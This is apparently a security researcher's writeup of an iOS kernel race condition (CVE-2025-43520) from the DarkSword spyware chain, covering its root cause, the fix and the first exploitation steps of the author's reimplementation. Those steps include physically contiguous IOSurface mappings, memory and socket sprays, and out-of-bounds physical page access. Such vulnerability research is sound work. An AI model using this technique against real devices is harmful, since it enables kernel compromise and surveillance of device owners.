---
title: Into the Dark - DarkSword Kernel Exploit Writeup
date: 2026-07-25
modified: 2026-07-25
tags: [iOS, jailbreak, kernel]
description: A clear look into DarkSword, the latest public Kernel Exploit up to iOS 26.0.1, its root cause, and its reimplementation as ClearSword.
image: /assets/img/trigon-legacy/oracle.png
---
## Table of Contents
1. [Introduction](#introduction)
2. [UPLs (Universal Page Lists)](#upls-universal-page-lists)
3. [Vulnerability](#vulnerability)
   - [[Do(n't)] Panic](#dont-panic)
   - [Determining contiguity](#determining-contiguity)
   - [Splitting the race](#splitting-the-race)
     - [Function setup](#function-setup)
     - [Race window](#race-window)
     - [OOB read and write primitives](#oob-read-and-write-primitives)
     - [First iteration](#first-iteration)
     - [Second iteration](#second-iteration)
     - [Function return](#function-return)
4. [ClearSword](#clearsword)
   - [Setup](#setup)
   - [Exploitation](#exploitation)
     - [Going out-of-bounds](#going-out-of-bounds)
5. [~~TFP0~~ Arbitrary Read/Write](#tfp0-arbitrary-readwrite)
6. [Open questions](#open-questions)
7. [Conclusion](#conclusion)

---

## Introduction

In March 2026, the iOS research scene was taken by storm with the discovery and disclosure of an in-the-wild exploit kit called [**Coruna**](https://cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit). It targeted every iPhone running iOS 13.0 - 17.2.1 and featured five different exploit chains, including bypasses for kernel PAC, PPL and even SPTM. To top it all off, two weeks later, another exploit kit was disclosed, [**DarkSword**](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain). This novel spyware chain was a WebKit to kernel chain, targeting iOS 18.4 - 18.7. It also featured some innovative techniques to achieve code execution in other userspace processes given its kernel read/write primitives and was used to exfiltrate data from target devices.

In this writeup, we'll be focusing on **DarkSword**'s kernel exploit, **CVE-2025-43520**. It's a race condition in the **VFS** subsystem, specifically in the `cluster_write_contig` and `cluster_read_contig` functions. All source code snippets from the exploit will be taken from my C reimplementation **ClearSword**, which you can find [here](https://github.com/TheRealClarity/ClearSword). **ClearSword** has been tested from iOS 15 up to 26.0.1, although it'll need some minimal offset tweaks to work on specific kernel versions.

## UPLs (Universal Page Lists)

To get a better understanding of the bug, we first need to get a little bit more context on what we're operating in.
We'll be starting by describing Universal Page Lists (UPLs), and the best way to do it is to let **XNU** do the work for us.

```c
/* from osfmk/mach/memory_object_types.h */
/*
 *  Universal Page List data structures
 *
 *  A UPL describes a bounded set of physical pages
 *  associated with some range of an object or map
 *  and a snapshot of the attributes associated with
 *  each of those pages.
 */
```
<figcaption>UPL definition from XNU</figcaption>

**UPLs** are objects which are used when other kernel subsystems, such as pagers, filesystems or I/O, need to describe and operate on pages managed by the **VM** system. They can be used to change caching, permissions and mapping behavior, and to push and pull (_commit_ or _abort_) data to and from **VM** objects. 

There are several "types" of **UPLs** in **XNU** and their attributes can be inferred from their flags. For example, they can be **Internal** or **External**, they can be **Vector UPLs** (which are "lists" of sub-UPLs), **I/O Wired UPLs** (which is the case with **DarkSword**), and they can be "Lite" or not depending if they have the `UPL_LITE` flag set or not. **"Lite" UPLs** operate directly on the target **VM** object, while **"Full" UPLs** aka **UPLs** without the `UPL_LITE` flag set operate on **"shadow" VM objects**. These objects are "private" and can be offset within the target **VM** object, with `vo_shadow_offset` identifying the range in which they are offset in that target object. Although they are shadows, and their backing `vm_page` objects are different from the target object's `vm_page` objects, they still point to the same underlying physical pages the target **VM** object does, so writes to them refer to the same physical memory.

<figure markdown="1">
```c
#define UPL_FLAGS_NONE          0x00000000ULL
#define UPL_COPYOUT_FROM        0x00000001ULL
#define UPL_PRECIOUS            0x00000002ULL
#define UPL_NO_SYNC             0x00000004ULL
#define UPL_CLEAN_IN_PLACE      0x00000008ULL
#define UPL_NOBLOCK             0x00000010ULL
#define UPL_RET_ONLY_DIRTY      0x00000020ULL
#define UPL_SET_INTERNAL        0x00000040ULL
#define UPL_QUERY_OBJECT_TYPE   0x00000080ULL
#define UPL_RET_ONLY_ABSENT     0x00000100ULL /* used only for COPY_FROM = FALSE */
#define UPL_FILE_IO             0x00000200ULL
#define UPL_SET_LITE            0x00000400ULL
#define UPL_SET_INTERRUPTIBLE   0x00000800ULL
#define UPL_SET_IO_WIRE         0x00001000ULL
/* more and more flags ... */

/* flags for return of state from vm_map_get_upl,  vm_upl address space */
/* based call */
#define UPL_DEV_MEMORY                  0x1
#define UPL_PHYS_CONTIG                 0x2
```
<figcaption>UPL Flags snippet</figcaption>
</figure>

There are a lot more **UPL** flags (really, there's a ton, the snippet above is greatly reduced from [memory_object_types.h](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/memory_object_types.h) in **XNU** source), but the one flag we'll be focusing on in this writeup is the flag which signals a **UPL** is **physically contiguous**, the `UPL_PHYS_CONTIG` flag. This means that the pages described by the **UPL** are contiguous in physical memory, meaning they're all located next to each other in the device's physical memory.

## Vulnerability

The easiest way to understand the bug is to look at the patch that fixed it. The bug in question is a race condition in the **VFS** subsystem in the `cluster_write_contig` and `cluster_read_contig` functions.

<div class="code-diff" markdown="1">
```c
  vm_map_t map = UIO_SEG_IS_USER_SPACE(uio->uio_segflg) ? current_map() : kernel_map;
  kret = vm_map_get_upl(map, vm_map_trunc_page(iov_base, vm_map_page_mask(map)),
  &upl_size, &upl[cur_upl], NULL, &pages_in_pl, &upl_flags, VM_KERN_MEMORY_FILE, 0);
+ if (!(upl_flags & UPL_PHYS_CONTIG)) {
+   /*
+    * The created UPL needs to have the UPL_PHYS_CONTIG flag.
+    */
+   error = EINVAL;
+   goto wait_for_creads;
+ }
  // removed some checks that are not important to the bug
  pl = ubc_upl_pageinfo(upl[cur_upl]);
  dst_paddr = ((addr64_t)upl_phys_page(pl, 0) << PAGE_SHIFT) + (addr64_t)upl_offset;
  while (((uio->uio_offset & (devblocksize - 1)) || io_size < devblocksize) && io_size) {
  // more checks removed
  error = cluster_align_phys_io(vp, uio, dst_paddr, head_size, CL_READ, callback, callback_arg);
```
<figcaption>Patch for the bug in DarkSword</figcaption>
</div>

At this point, `upl_flags` was checked for the `UPL_PHYS_CONTIG` flag. Since the underlying mapping was physically contiguous, execution followed the `cluster_write_contig` code path. However, there was a race condition where the mapping at the same virtual address could be replaced with a different mapping that was no longer physically contiguous.

This happened because the code:

- Only checked the mapping once, early in the code path, instead of verifying it again when creating the actual **UPL** in `cluster_write_contig`. The call to `vm_map_get_upl` creates the **UPL** and returns its flags, but those flags were not validated. The fix now checks the returned flags immediately after the **UPL** is created.
- Incorrectly assumed that the mapping would remain physically contiguous throughout the operation.

Visualizing different scenarios helps:

<small>*Note: Diagrams generated with help from AI, everything else is my blood, sweat and tears :)*</small>

**Scenario 1:**

<figure>
<img src="{{ '/assets/img/clearsword/contiguous_mapping.svg' | relative_url }}" alt="Contiguous mapping">
<figcaption>Contiguous mapping</figcaption>
</figure>

We establish a contiguous mapping. All of its pages are adjacent to each other both in virtual and physical memory.

**Scenario 2**

<figure>
<img src="{{ '/assets/img/clearsword/not_contiguous_mapping.svg' | relative_url }}" alt="Not contiguous mapping">
<figcaption>Not contiguous mapping</figcaption>
</figure>

We establish a non-contiguous mapping. Although the virtual memory addresses are still adjacent to each other, the underlying physical pages are not, and can instead be scattered all over physical memory.

**Scenario 3**

<figure>
<img src="{{ '/assets/img/clearsword/remap.svg' | relative_url }}" alt="OOB physical page remap">
<figcaption>OOB physical page remap</figcaption>
</figure>

We remap the original virtual region to a physically non-contiguous mapping during the race window. The code incorrectly assumes that the pages are adjacent to each other both in virtual and physical memory and ends up performing operations on unrelated physical pages.

### [Do(n't)] Panic

Since we have access to an exploit, kindly provided by [whoever this guy is](https://github.com/htimesnine/DarkSword-RCE), all we need to do is to single step through **XNU** and follow the call chain until we figure it out.
Since **Apple** does not provide us with an official way to do this, and my wallet does not like the official third-party solution, we have to settle on the good ol' fashion way of debugging: **panic logs**!

<figure markdown="1">
```c
Kernel Frames:
  00: kernelcache (__TEXT_EXEC) 0xfffffe0008286544 (slide=0x3dde8000) func_fffffe00082864d8 + 108
  01: kernelcache (__TEXT_EXEC) 0xfffffe0008285e64 (slide=0x3dde8000) func_fffffe0008285aa4 + 960
  02: kernelcache (__TEXT_EXEC) 0xfffffe0008acb574 (slide=0x3dde8000) func_fffffe0008acb574
  03: kernelcache (__TEXT_EXEC) 0xfffffe0008ad7040 (slide=0x3dde8000) _sleh_synchronous_sp1
  04: kernelcache (__TEXT_EXEC) 0xfffffe00084214ac (slide=0x3dde8000) func_fffffe0008420f04 + 1448
  05: kernelcache (__TEXT_EXEC) 0xfffffe000841e5d8 (slide=0x3dde8000) _sleh_synchronous + 636
  06: kernelcache (__TEXT_EXEC) 0xfffffe0008243cc0 (slide=0x3dde8000) _fleh_synchronous + 72
  07: kernelcache (__TEXT_EXEC) 0xfffffe0008add27c (slide=0x3dde8000) _memmove + 44
  08: kernelcache (__TEXT_EXEC) 0xfffffe000841d180 (slide=0x3dde8000) _bcopy_phys_internal + 964
  09: kernelcache (__TEXT_EXEC) 0xfffffe00084654e0 (slide=0x3dde8000) _cluster_align_phys_io + 304
  10: kernelcache (__TEXT_EXEC) 0xfffffe0008462cbc (slide=0x3dde8000) _cluster_write_contig + 808
  11: kernelcache (__TEXT_EXEC) 0xfffffe0008461ec0 (slide=0x3dde8000) _cluster_write_ext + 608
  12: kernelcache (__TEXT_EXEC) 0xfffffe0008461c54 (slide=0x3dde8000) _cluster_write + 28
  13: kernelcache (__TEXT_EXEC) 0xfffffe000ae171fc (slide=0x3dde8000) _apfs_vnop_write + 36937036
  14: kernelcache (__TEXT_EXEC) 0xfffffe00084a8b68 (slide=0x3dde8000) _VNOP_WRITE + 108
  15: kernelcache (__TEXT_EXEC) 0xfffffe000849f5e4 (slide=0x3dde8000) _vn_write + 1624
  16: kernelcache (__TEXT_EXEC) 0xfffffe00087e156c (slide=0x3dde8000) func_fffffe00087e14dc + 144
  17: kernelcache (__TEXT_EXEC) 0xfffffe00087e19f8 (slide=0x3dde8000) func_fffffe00087e1794 + 612
  18: kernelcache (__TEXT_EXEC) 0xfffffe00087e1f78 (slide=0x3dde8000) func_fffffe00087e1e28 + 336
  19: kernelcache (__TEXT_EXEC) 0xfffffe00089009ac (slide=0x3dde8000) func_fffffe00089006c0 + 748
  20: kernelcache (__TEXT_EXEC) 0xfffffe000841e664 (slide=0x3dde8000) _sleh_synchronous + 776
  21: kernelcache (__TEXT_EXEC) 0xfffffe0008243cc0 (slide=0x3dde8000) _fleh_synchronous + 72
```
<figcaption>iPhone 17 Pro Max Panic, thanks to <strong>Cryptic</strong> and <strong>blacktop</strong>!</figcaption>
</figure>

[Cryptic](https://github.com/cryptiiiic) ran **ClearSword** on his iPhone 17 Pro Max running iOS 26.0.1, and by using [ipsw](https://github.com/blacktop/ipsw) by [blacktop](https://github.com/blacktop) to symbolicate the panic log, and also after a little bit of manual symbolication, we were able to figure out the **XNU** side of the call chain:
```
vn_write -> VNOP_WRITE -> apfs_vnop_write -> cluster_write -> cluster_write_ext -> 
-> cluster_write_contig -> cluster_align_phys_io
```
<figcaption>XNU call chain</figcaption>

### Determining contiguity

_The call chain we'll be describing next is the `write` call chain. The same logic will apply to the `read` call chain._

We'll start by analyzing the call chain starting from `cluster_write_ext`. This function is part of the **VFS** (Virtual File System), which is a subsystem of **XNU** which acts as an "API" to abstract interactions with filesystems and I/O operations. This is why we see `vn_write`, `VNOP_WRITE`, and `apfs_vnop_write` before it in the call chain. We won't be delving into them since they're not particularly interesting for this case.

To reach the vulnerable function, the code needs to assume it has to perform a read/write operation on a contiguously mapped range of memory.
`cluster_write_ext` is called from `cluster_write` (which is simply a wrapper which sets no callback) and its job is to decide which read/write strategy should be used:
- `cluster_write_copy` is the "cached" copy strategy. The data is copied from the source `uio` through the vnode's file cache and may be written back asynchronously.
- `cluster_write_direct` is the "direct" copy strategy. The writes bypass the vnode's file cache and go straight to the underlying filesystem / I/O subsystem. The physical pages do not need to be contiguous. The **UPL** describes the physical pages.
- `cluster_write_contig` is the physically contiguous copy strategy. Since the underlying physical pages form a continuous range, the first page of the **UPL** (`src_paddr` in the function) is used to calculate the starting physical address and all writes are performed relatively from it by adding an **UPL** offset, since all the pages are next to each other in physical memory.

Inside `cluster_write_ext`, the following logic selects the write strategy:
```c
if (((flags & (IO_NOCACHE | IO_NODIRECT)) == IO_NOCACHE) && UIO_SEG_IS_USER_SPACE(uio->uio_segflg)) {
  // removed some irrelevant code here...
  retval = cluster_io_type(uio, &write_type, &write_length, min_direct_size);
}
```
<figcaption>cluster_write_ext snippet</figcaption>

The code enters this block only if `IO_NOCACHE` is set, `IO_NODIRECT` is not set, and the `uio` request targets userspace. The block then determines whether to replace the default cached copy strategy.

Next, inside `cluster_io_type`, the code calls `vm_map_get_upl` and sets `UPL_QUERY_OBJECT_TYPE`, which queries the **VM** system for properties of the backing **VM** object. It then uses the returned `upl_flags` to determine if the mapping is physically contiguous or not. Later, `cluster_write_contig` calls `vm_map_get_upl` again, this time to create the actual **UPL**.

```c
if (upl_flags & UPL_PHYS_CONTIG) {
  *io_type = IO_CONTIG;
} else if (iov_len >= min_length) {
  *io_type = IO_DIRECT;
} else {
  *io_type = IO_COPY;
}
```
<figcaption>cluster_io_type snippet</figcaption>

If the returned flags contain `UPL_PHYS_CONTIG`, the code selects the physically contiguous copy strategy and calls the vulnerable `cluster_write_contig` function!

### Splitting the race

We are now inside `cluster_write_contig`, so let's start by splitting the function into 3 sections:

#### Function setup

```c
devblocksize = (u_int32_t)vp->v_mount->mnt_devblocksize;
mem_alignment_mask = (u_int32_t)vp->v_mount->mnt_alignmentmask;
io_size = *write_length;
iov_base = uio_curriovbase(uio);
upl_offset = (vm_offset_t)((u_int32_t)iov_base & PAGE_MASK);
```
<figcaption>cluster_write_contig function setup</figcaption>

Before looking at the function setup, it's important to look into one of the function's parameters, `uio`. In **XNU**, `uio` can be thought of as an I/O "cursor", the representation of an I/O operation. It keeps track of the userspace buffer to read from/write to, its length and the current file offset and if the current operation is read or write. 

When the process calls `readv`, `writev`, `preadv`, or `pwritev`, the kernel copies the supplied `struct iovec` into a kernel owned `struct uio`. The `iovec` controls the userspace buffer’s base address and length, while the syscall’s offset argument controls `uio_offset`. The copied `iovec` base is stored in `uio_iovbase`.

The function starts by assigning some variables:
- `devblocksize` and `mem_alignment_mask` are retrieved from the vnode's mount struct. `devblocksize` is the mount's device block size, and `mem_alignment_mask` is the alignment mask of such block. Their values for the exploit we're working with are set to `0x1000` and `0xfff` respectively.
- `io_size` is the variable which keeps track of how many bytes are left to process in the current cluster operation. It's initialized to `*write_length`, which comes from the `iov` we passed when making the syscall.
- `iov_base` is `uio->uio_iovbase`.
- `upl_offset` is the offset within the first page of `iov_base`.

<details markdown="1">
<summary>Fetching devblocksize</summary>
To fetch `devblocksize`, the logic would be to follow the `proc -> p_fd -> fd_ofiles -> fproc[(fd)]-> fglob -> fg_data (vnode) -> v_mount -> mnt_devblocksize` chain, but that's a looooot of reads and offsets. Luckily, there's an easier way. We can simply use a pre-jailbroken device and get `devblocksize` from it using the `stat` command.
```c
mobile@iPad-M1 ~ % stat -f /var
  File: "/var"
    ID: 10000060000001b Namelen: ?       Type: apfs
Block size: 4096       Fundamental block size: 4096
Blocks: Total: 31232069   Free: 7232506    Available: 7232506
Inodes: Total: 289821132  Free: 289300240
```
<figcaption>Retrieving block size on an iPad Pro M1 running iOS 15</figcaption>

In this case, `devblocksize` is `4096` aka `0x1000`. There's also an alternative way to retrieve it without the huge offset mess, props to [staturnz](https://github.com/staturnzz). We can use the `DKIOCGETPHYSICALBLOCKSIZE` ioctl! This alternative doesn't even require you to be jailbroken.

<figure>
<img src="{{ '/assets/img/clearsword/devblocksz.png' | relative_url }}" alt="devblocksize">
<figcaption>DKIOCGETPHYSICALBLOCKSIZE ioctl</figcaption>
</figure>
</details>

#### Race window

After the setup, the function creates a **UPL** for the current cluster operation. Unlike the earlier call inside `cluster_io_type`, which only supplied the `UPL_QUERY_OBJECT_TYPE` flag, this call supplies all flags required to actually perform the creation of the **UPL**.

```c
upl_flags = UPL_FILE_IO | UPL_COPYOUT_FROM | UPL_NO_SYNC | UPL_CLEAN_IN_PLACE | UPL_SET_INTERNAL | UPL_SET_LITE | UPL_SET_IO_WIRE;
kret = vm_map_get_upl(map,
    vm_map_trunc_page(iov_base, vm_map_page_mask(map)),
    &upl_size, &upl[cur_upl], NULL, &pages_in_pl, &upl_flags, VM_KERN_MEMORY_FILE, 0);
src_paddr = ((addr64_t)upl_phys_page(pl, 0) << PAGE_SHIFT) + (addr64_t)upl_offset;
```
<figcaption>Vulnerable UPL creation</figcaption>

This is the actual section of kernel code that we race. For the exploit to work, we have to race changing the underlying userspace mapping between the `vm_map_get_upl` call in `cluster_io_type` and the one now in `cluster_write_contig`, by swapping the supposed contiguous mapping with a non-contiguous one. The fix has been implemented here, checking if the flags returned by `vm_map_get_upl` contain `UPL_PHYS_CONTIG`.

`src_paddr` is just the physical address of the first page which belongs to the **UPL** we have just created, with `upl_offset` added to it. Since the mapping hopefully has been swapped, it is now the physical address of the first page from the new mapping. Because every page of the **UPL** is assumed to be physically adjacent, the function derives the physical base address from the first **UPL** page and performs operations at offsets relative to it. The issue arises that operations can be performed on an unrelated nearby page in physical memory, corrupting kernel memory or leaking data from it.

#### OOB read and write primitives
```c
while (((uio->uio_offset & (devblocksize - 1)) || io_size < devblocksize) && io_size) {
  head_size = devblocksize - (u_int32_t)(uio->uio_offset & (devblocksize - 1));
  if (head_size > io_size) {
    head_size = io_size;
  }

  error = cluster_align_phys_io(vp, uio, src_paddr, head_size, 0, callback, callback_arg);

  upl_offset += head_size;
  src_paddr  += head_size;
  io_size    -= head_size;
  iov_base   += head_size;
}
```
<figcaption>OOB processing loop</figcaption>

Following the call chain logic, we now reach `cluster_align_phys_io`. This function performs the actual OOB read and write primitives.

`cluster_align_phys_io` is inside a `while` loop, which contains some interesting conditions:

```c
while (((uio->uio_offset & (devblocksize - 1)) || io_size < devblocksize) && io_size)
```

Let's first analyze each condition of the `while` loop, one by one. 
- First, either `uio->uio_offset` must be unaligned to `devblocksize` **OR** `io_size` needs to be smaller than `devblocksize`. 
- Second, the loop continues as long as `io_size` is not 0.

#### First iteration

In the case of this exploit, the values are initially set to:

| Variable | Value | Description |
| :--- | :--- | :--- |
| `uio->uio_offset` | `0x3f00` | Unaligned file offset |
| `io_size` | `0x1000` (`0xf00 + 0x100`) | Bytes remaining to process in the cluster operation |
| `iov_base` | `buffer + 0x3f00` | Userspace `iov` virtual address |
| `src_paddr` | `phys(first upl page) + 0x3f00` | Swapped with the non-contiguous mapping during race |

So in the first iteration:
```c
uio->offset unaligned? -> true
io_size < devblocksize -> false
io_size != 0 -> true
(true || false) && true = true
```
So we enter the loop.
Inside it, the kernel calculates `head_size`, which is the number of bytes which need to be processed before reaching a block boundary. In our case it's be `0x1000 - (0x3f00 & 0xfff) = 0x1000 - 0xf00 = 0x100`.

`cluster_align_phys_io` is called and `0x100` bytes are copied at offset 0x3f00 from the file into the buffer or vice-versa, depending on the call. We now move to the second loop iteration.

#### Second iteration

With the first iteration finished, the values for the next `while` loop iteration have been updated. For this second iteration, the values are now:

| Variable | Value | Description |
| :--- | :--- | :--- |
| `uio->uio_offset` | `0x4000` | Offset is now `0x100` bytes forward and block aligned |
| `io_size` | `0xf00` | Working with `0x100` fewer bytes |
| `iov_base` | `buffer + 0x4000` | Userspace `iov` virtual address |
| `src_paddr` | `phys(first UPL page) + 0x4000` | Now possibly an out-of-bounds physical page! |

Now for the second iteration, the initial conditions are evaluated as:
```c
uio->offset unaligned? -> false
io_size < devblocksize -> true
io_size != 0 -> true
(false || true) && true = true
```
`uio->offset` is now block aligned but since `io_size` is `0xf00` and thus smaller than one block, and since there's still data to be processed, the loop continues.

This time, `head_size` is initially set to `0x1000`. However, there's the following check:
```c
if (head_size > io_size) {
  head_size = io_size;
}
```
`head_size` is trimmed to `io_size`, which is now `0xf00`. `cluster_align_phys_io` then writes or leaks `0xf00` bytes one physical page after the first page of the **UPL**, which due to the race condition, **is possibly now an unrelated out-of-bounds physical page**!

#### Function return

There is no third `while` iteration because `io_size` is set to 0, so the expression always evaluates to `false`. 
After the second iteration, the final state ends up being:

| Variable | Value |
| :--- | :--- |
| `uio->uio_offset` | `0x4f00` |
| `io_size` | `0x0` |
| `iov_base` | `buffer + 0x4f00` |
| `src_paddr` | `phys(first UPL page) + 0x4f00` |


After the `while` loop, the following alignment check fails:
```c
if ((u_int32_t)iov_base & mem_alignment_mask) {
  /*
    * request doesn't set up on a memory boundary
    * the underlying DMA engine can handle...
    * return an error instead of going through
    * the slow copy path since the intent of this
    * path is direct I/O from device memory
    */
  error = EINVAL;
  goto wait_for_cwrites;
}
```
<figcaption>Error set in cluster_write_contig</figcaption>

If `iov_base` is not aligned to `mem_alignment_mask`, the error variable is set to `EINVAL`. The function enters a cleanup path and returns. Although an error is returned, this is actually very useful to us. 

This is because the actual OOB read or write has already happened, but an interesting condition was set: `error` propagates to userland, setting `errno` to `EINVAL`, which means that for us to check if the race worked or not, we can simply check `errno` after the syscall returns:
```c
[err] pwritev: -1 (errno=Invalid argument)
```
<figcaption>errno during exploit run</figcaption>

And with the kernel part out of the way, we can now move to the actual exploitation...

## ClearSword

### Setup

The exploit starts by creating two temporary files and getting hold of their file descriptors: the `read_fd` and the `write_fd`. After creation, they are instantly deleted with a `remove` call. This makes it so that, once our process exits, the temporary files are instantly cleaned up, leaving no traces behind.
After this, comes one of the most important parts of the exploit. 
```c
fcntl(g_ctx.read_fd, F_NOCACHE, 1);
fcntl(g_ctx.write_fd, F_NOCACHE, 1);
```
<figcaption>Disabling fd cache</figcaption>

These calls set `F_NOCACHE` on both file descriptors, disabling filesystem caching on both files. If this flag is not set, the contiguous copy strategy would never end up being selected, and the default cached copy strategy would be used instead, making exploitation impossible. Following this, the exploit proceeds to create a secondary thread and retrieves its own executable name which is later used as an oracle.

Continuing the setup, we create the physically contiguous mapping used for exploitation. For this, we'll use our good old friend: **PurpleGfxMem**! We've used it in [TrigonLegacy](https://therealclarity.github.io/blog/trigon-legacy/) and we're using it again now with **ClearSword**. It's the easiest way to get a physically contiguous mapping. We allocate a two page `IOSurface` in **PurpleGfxMem** and then use `mach_vm_map` to get a mapping from it. With this ready, setup is complete and the real exploitation begins.

```c
CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
                                                          &kCFTypeDictionaryValueCallBacks);
CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), CFNUM(size));
CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
IOSurfaceRef surface = IOSurfaceCreate(dict);
```
<figcaption>Creating an IOSurface in PurpleGfxMem</figcaption>

### Exploitation

We'll start by allocating **1GiB** of memory, split into eight "search mappings" of **128MiB** each with `mach_vm_allocate`.
```c
mach_vm_allocate(mach_task_self(), &search_mapping_address, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
```
<figcaption>Allocating search mappings</figcaption>

`VM_FLAGS_RANDOM_ADDR` randomizes the kernel placement of the mapping, not its underlying physical pages. `VM_FLAGS_ANYWHERE` returns any suitable address in our address space and `VM_FLAGS_FIXED` allocates the mapping at an address of our choice.

Given the huge size of our mapping, a continuous free chunk of 128MiB in physical memory is unlikely to exist, so we've pretty much guaranteed that several sections of our search mapping will not end up being adjacent to each other in physical memory, which means that if we use our out-of-bounds primitive, we're very likely to be able to access unrelated adjacent physical pages. 

We then place a marker at the start of each page of each 128MiB mapping. This faults every page, forcing the kernel to allocate a backing physical page for every single page in our search mapping. We then spray a large amount of sockets, hopefully having some of them ending up in between some of the pages of our search mapping.

After creating each socket, we proceed to call `fileport_makeport`, which converts a file descriptor (sockets are represented by file descriptors) into a **Mach fileport**, which is a special type of **Mach port** which can be sent to other processes. We then use the `__proc_info` syscall to retrieve the socket info of each of the sockets we created. This syscall will return a `socket_fdinfo` struct back to userspace, from which we'll retrieve the `gencnt` field. `gencnt` is a unique, incrementing, generation counter for the `inpcb` struct of a socket, so it can be used to uniquely identify it. We'll use this quirk to find out to which socket the `inpcb` struct we found out-of-bounds belongs to.

<details markdown="1">
<summary>Retrieving gencnt</summary>
`proc_info` is a syscall used to retrieve process information. In **XNU**, its syscall number is 336.
In the original implementation, it's accessed through `syscall` instead of `__proc_info`. I opted for the latter since it's much more readable:
```c
// DarkSword implementation
syscall(336n, 6n, getpid(), 3n, output_socket_port, socket_info, 0x400n);
// ClearSword implementation
__proc_info(PROC_INFO_CALL_PIDFILEPORTINFO, getpid(), PROC_PIDFILEPORTSOCKETINFO, output_socket_port, socket_info, 0x400);
```
<figcaption>DarkSword/ClearSword syscall comparison</figcaption>

Here, the `proc_info` syscall is used to retrieve file port information for the current process. `output_socket_port` is the mach fileport for the socket we've just created and `socket_info` is a buffer where information about the socket is returned to userspace by the syscall.

Tracing the syscall implementation, we end up at `proc_fileport_info`:

```c
static kern_return_t
proc_fileport_info(__unused mach_port_name_t name,
    struct fileglob *fg, void *arg)
{
// some other cases for the switch
	case PROC_PIDFILEPORTSOCKETINFO: {
		socket_t so;

		if (FILEGLOB_DTYPE(fg) != DTYPE_SOCKET) {
			error = EOPNOTSUPP;
			break;
		}
		so = (socket_t)fg_get_data(fg);
		error = pid_socketinfo(so, fp, PROC_NULL,
		    fia->fia_buffer, fia->fia_buffersize, fia->fia_retval);
	}       break;
```
<figcaption>proc_fileport_info</figcaption>

If we then follow the implementation into `pid_socketinfo`:
```c
int
pid_socketinfo(socket_t so, struct fileproc *fp, proc_t proc, user_addr_t  buffer, __unused uint32_t buffersize, int32_t * retval)
{
	struct socket_fdinfo s;
	int error = 0;

	bzero(&s, sizeof(struct socket_fdinfo));
	fill_fileinfo(fp, proc, &s.pfi);
	if ((error = fill_socketinfo(so, &s.psi)) == 0) {
		if ((error = copyout(&s, buffer, sizeof(struct socket_fdinfo))) == 0) {
			*retval = sizeof(struct socket_fdinfo);
		}
	}
// ...
}
```
<figcaption>pid_socketinfo</figcaption>

A struct `socket_fdinfo` is created and filled with information about the socket and this struct is then copied out to userspace. But what information does this struct contain?

```c
struct socket_fdinfo {
	struct proc_fileinfo    pfi;
	struct socket_info      psi;
};
```
<figcaption>socket_fdinfo</figcaption>

If we then take a look at `proc_fileinfo`, it's just some general information:

```c
struct proc_fileinfo {
	uint32_t                fi_openflags;
	uint32_t                fi_status;
	off_t                   fi_offset;
	int32_t                 fi_type;
	uint32_t                fi_guardflags;
};
```
<figcaption>proc_fileinfo</figcaption>

But if we look at `socket_info`:

```c
struct socket_info {
	struct vinfo_stat                       soi_stat;
	uint64_t                                soi_so;         /* opaque handle of socket */
	uint64_t                                soi_pcb;        /* opaque handle of protocol control block */
	int                                     soi_type;
	int                                     soi_protocol;
	int                                     soi_family;
	short                                   soi_options;
	short                                   soi_linger;
	short                                   soi_state;
	short                                   soi_qlen;
	short                                   soi_incqlen;
	short                                   soi_qlimit;
	short                                   soi_timeo;
	u_short                                 soi_error;
	uint32_t                                soi_oobmark;
	struct sockbuf_info                     soi_rcv;
	struct sockbuf_info                     soi_snd;
	int                                     soi_kind;
	uint32_t                                rfu_1;          /* reserved */
	union {
		struct in_sockinfo      pri_in;                 /* SOCKINFO_IN */
		struct tcp_sockinfo     pri_tcp;                /* SOCKINFO_TCP */
		struct un_sockinfo      pri_un;                 /* SOCKINFO_UN */
		struct ndrv_info        pri_ndrv;               /* SOCKINFO_NDRV */
		struct kern_event_info  pri_kern_event;         /* SOCKINFO_KERN_EVENT */
		struct kern_ctl_info    pri_kern_ctl;           /* SOCKINFO_KERN_CTL */
		struct vsock_sockinfo   pri_vsock;              /* SOCKINFO_VSOCK */
	}                                       soi_proto;
};
```
<figcaption>socket_info</figcaption>

We get a lot of information back about the socket. Since our socket kind is `SOCKINFO_IN`, the union `soi_proto` resolves to an `in_sockinfo` struct. If we take a good look at this struct we'll see:

```c
struct in_sockinfo {
	int                                     insi_fport;             /* foreign port */
	int                                     insi_lport;             /* local port */
	uint64_t                                insi_gencnt;            /* generation count of this instance */
	uint32_t                                insi_flags;             /* generic IP/datagram flags */
	uint32_t                                insi_flow;

	uint8_t                                 insi_vflag;             /* ini_IPV4 or ini_IPV6 */
	uint8_t                                 insi_ip_ttl;            /* time to live proto */
	uint32_t                                rfu_1;                  /* reserved */
	/* protocol dependent part */
	union {
		struct in4in6_addr      ina_46;
		struct in6_addr         ina_6;
	}                                       insi_faddr;             /* foreign host table entry */
	union {
		struct in4in6_addr      ina_46;
		struct in6_addr         ina_6;
	}                                       insi_laddr;             /* local host table entry */
	struct {
		u_char                  in4_tos;                        /* type of service */
	}                                       insi_v4;
	struct {
		uint8_t                 in6_hlim;
		int                     in6_cksum;
		u_short                 in6_ifindex;
		short                   in6_hops;
	}                                       insi_v6;
};
```
<figcaption>in_sockinfo</figcaption>

Its third field, `insi_gencnt` is the generation count of this instance. We use this field to identify which socket owns the inpcb found in memory.
</details>

Next, we create a memory entry for the 128MiB search mapping. This is needed because we then proceed to create an IOSurface over its region and call `IOSurfacePrefetchPages` on it. There's... not much information online on `IOSurfacePrefetchPages` but we can deduce what it does by its name: it prefetches all pages of an `IOSurface` into physical memory, before they are even needed. This ensures that the entire mapping is resident in physical memory, and thus we are ready to start searching out-of-bounds from it.


```c
CFMutableDictionaryRef properties = CFDictionaryCreateMutable(
    kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
CFDictionarySetValue(properties, CFSTR("IOSurfaceAddress"), CFNUM(address));
CFDictionarySetValue(properties, CFSTR("IOSurfaceAllocSize"), CFNUM(size));
